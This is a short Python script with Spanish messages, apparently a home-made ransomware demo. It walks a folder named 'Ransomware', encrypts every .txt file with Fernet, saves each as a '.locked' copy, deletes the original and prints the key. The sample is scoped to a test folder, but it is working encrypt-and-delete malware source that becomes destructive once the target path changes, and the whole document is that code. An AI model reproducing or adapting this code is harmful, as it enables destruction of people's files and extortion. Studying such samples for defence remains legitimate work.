#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Generar clave única
key = Fernet.generate_key()
cipher = Fernet(key)

for root, _, files in os.walk("/home/wvverez/Escritorio/Ransomware"):
    for file in files:
        if file.endswith(('.txt')):
            file_path = os.path.join(root, file)

            try:
                with open(file_path, 'rb') as f:
                    data = f.read()

                encrypted = cipher.encrypt(data)

                with open(file_path + '.locked', 'wb') as f:
                    f.write(encrypted)

                os.remove(file_path)
            except:
                pass

print(f"\n[+] los archivos .txt han sido cifrados\n")
print(f"\n[+] key: {key.decode()}\n")
